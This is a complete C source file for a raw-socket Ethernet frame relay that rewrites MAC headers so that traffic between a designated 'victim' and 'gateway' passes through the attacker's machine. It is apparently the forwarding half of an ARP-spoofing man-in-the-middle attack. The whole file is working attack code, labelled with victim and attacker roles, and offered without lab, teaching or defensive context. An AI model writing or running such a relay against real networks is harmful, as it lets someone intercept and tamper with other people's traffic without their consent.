// fast_forward.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <sys/uio.h>
#include <time.h>

#ifndef BATCH_SIZE
#define BATCH_SIZE 32
#endif

#ifndef MAX_FRAME
#define MAX_FRAME 4096
#endif

static void usage(const char *p) {
    fprintf(stderr, "Usage: %s <ifname> <victim-mac> <gateway-mac>\n", p);
    fprintf(stderr, "Example: %s eth0 aa:bb:cc:dd:ee:01 aa:bb:cc:dd:ee:02\n", p);
}

static int mac_str_to_bin(const char *str, uint8_t *mac) {
    int vals[6];
    if (sscanf(str, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6) {
        return -1;
    }
    for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)vals[i];
    return 0;
}

static int get_iface_index(int fd, const char *ifname) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) return -1;
    return ifr.ifr_ifindex;
}

static int get_iface_hwaddr(int fd, const char *ifname, uint8_t *mac_out) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) return -1;
    memcpy(mac_out, ifr.ifr_hwaddr.sa_data, 6);
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 4) {
        usage(argv[0]);
        return 2;
    }

    const char *ifname = argv[1];
    uint8_t victim_mac[6], gateway_mac[6], attacker_mac[6];
    if (mac_str_to_bin(argv[2], victim_mac) < 0 ||
        mac_str_to_bin(argv[3], gateway_mac) < 0) {
        fprintf(stderr, "Bad MAC format. Use aa:bb:cc:dd:ee:ff\n");
        return 2;
    }

    if (geteuid() != 0) {
        fprintf(stderr, "Must run as root\n");
        return 1;
    }

    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        perror("socket");
        return 1;
    }

    // optional: increase rx/tx buffers
    int rcvbuf = 4 * 1024 * 1024;
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    int ifindex = get_iface_index(s, ifname);
    if (ifindex < 0) {
        perror("SIOCGIFINDEX");
        close(s);
        return 1;
    }
    if (get_iface_hwaddr(s, ifname, attacker_mac) < 0) {
        perror("SIOCGIFHWADDR");
        close(s);
        return 1;
    }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = ifindex;

    if (bind(s, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
        perror("bind");
        close(s);
        return 1;
    }

    fprintf(stderr, "iface=%s idx=%d\n", ifname, ifindex);
    fprintf(stderr, "attacker mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
            attacker_mac[0], attacker_mac[1], attacker_mac[2],
            attacker_mac[3], attacker_mac[4], attacker_mac[5]);
    fprintf(stderr, "victim  mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
            victim_mac[0], victim_mac[1], victim_mac[2],
            victim_mac[3], victim_mac[4], victim_mac[5]);
    fprintf(stderr, "gateway mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
            gateway_mac[0], gateway_mac[1], gateway_mac[2],
            gateway_mac[3], gateway_mac[4], gateway_mac[5]);

    // allocate buffers for recvmmsg
    struct iovec *r_iov = calloc(BATCH_SIZE, sizeof(struct iovec));
    struct mmsghdr *r_msgs = calloc(BATCH_SIZE, sizeof(struct mmsghdr));
    void **r_bufs = calloc(BATCH_SIZE, sizeof(void*));
    struct sockaddr_ll *r_addr = calloc(BATCH_SIZE, sizeof(struct sockaddr_ll));
    if (!r_iov || !r_msgs || !r_bufs || !r_addr) {
        fprintf(stderr, "malloc fail\n");
        return 1;
    }
    for (int i = 0; i < BATCH_SIZE; ++i) {
        r_bufs[i] = malloc(MAX_FRAME);
        if (!r_bufs[i]) { perror("malloc"); return 1; }
        r_iov[i].iov_base = r_bufs[i];
        r_iov[i].iov_len = MAX_FRAME;
        r_msgs[i].msg_hdr.msg_iov = &r_iov[i];
        r_msgs[i].msg_hdr.msg_iovlen = 1;
        r_msgs[i].msg_hdr.msg_name = &r_addr[i];
        r_msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_ll);
    }

    // allocate arrays for sendmmsg
    struct iovec *s_iov = calloc(BATCH_SIZE, sizeof(struct iovec));
    struct mmsghdr *s_msgs = calloc(BATCH_SIZE, sizeof(struct mmsghdr));
    struct sockaddr_ll *s_addr = calloc(BATCH_SIZE, sizeof(struct sockaddr_ll));
    if (!s_iov || !s_msgs || !s_addr) {
        fprintf(stderr, "malloc fail send arrays\n");
        return 1;
    }

    // precompute MAC bytes as arrays for quick compare
    uint8_t vmac[6], gmac[6], amac[6];
    memcpy(vmac, victim_mac, 6);
    memcpy(gmac, gateway_mac, 6);
    memcpy(amac, attacker_mac, 6);

    // Simple counters for insight
    uint64_t forwarded = 0;
    uint64_t dropped = 0;
    time_t last_ts = time(NULL);

    while (1) {
        int rv = recvmmsg(s, r_msgs, BATCH_SIZE, 0, NULL);
        if (rv < 0) {
            if (errno == EINTR) continue;
            perror("recvmmsg");
            break;
        }
        // prepare sends
        int s_count = 0;
        for (int i = 0; i < rv; ++i) {
            int len = r_msgs[i].msg_len;
            if (len < 14) { dropped++; continue; }
            uint8_t *buf = (uint8_t*)r_bufs[i];

            // extract source MAC (bytes 6..11)
            uint8_t *src = buf + 6;
            // quick compare
            if (memcmp(src, amac, 6) == 0) {
                // ignore frames we injected
                continue;
            }

            // decide whether this frame is from victim or gateway
            if (memcmp(src, vmac, 6) == 0) {
                // rewrite dst = gateway, src = attacker
                memcpy(buf + 0, gmac, 6);
                memcpy(buf + 6, amac, 6);
            } else if (memcmp(src, gmac, 6) == 0) {
                // rewrite dst = victim, src = attacker
                memcpy(buf + 0, vmac, 6);
                memcpy(buf + 6, amac, 6);
            } else {
                // not relevant; drop
                dropped++;
                continue;
            }

            // prepare send mmsghdr entry (use same buffer)
            s_iov[s_count].iov_base = buf;
            s_iov[s_count].iov_len = len;
            memset(&s_addr[s_count], 0, sizeof(s_addr[s_count]));
            s_addr[s_count].sll_family = AF_PACKET;
            s_addr[s_count].sll_ifindex = ifindex;
            s_addr[s_count].sll_halen = ETH_ALEN;
            // destination hardware address: already in frame[0:6], but the kernel expects sockaddr too
            memcpy(s_addr[s_count].sll_addr, buf + 0, 6);

            s_msgs[s_count].msg_hdr.msg_iov = &s_iov[s_count];
            s_msgs[s_count].msg_hdr.msg_iovlen = 1;
            s_msgs[s_count].msg_hdr.msg_name = &s_addr[s_count];
            s_msgs[s_count].msg_hdr.msg_namelen = sizeof(struct sockaddr_ll);
            s_msgs[s_count].msg_hdr.msg_control = NULL;
            s_msgs[s_count].msg_hdr.msg_controllen = 0;
            s_msgs[s_count].msg_hdr.msg_flags = 0;
            s_msgs[s_count].msg_len = 0; // filled by kernel on recv; for sendmmsg not needed.

            s_count++;
            forwarded++;
        }

        if (s_count > 0) {
            int sent = sendmmsg(s, s_msgs, s_count, 0);
            if (sent < 0) {
                perror("sendmmsg");
                // continue; we still cycle
            } else if (sent < s_count) {
                // partial send — adjust counters if desired
            }
        }

        time_t now = time(NULL);
        if (now != last_ts) {
            fprintf(stderr, "fwd=%lu dropped=%lu\n", (unsigned long)forwarded, (unsigned long)dropped);
            last_ts = now;
        }
    }

    close(s);
    return 0;
}
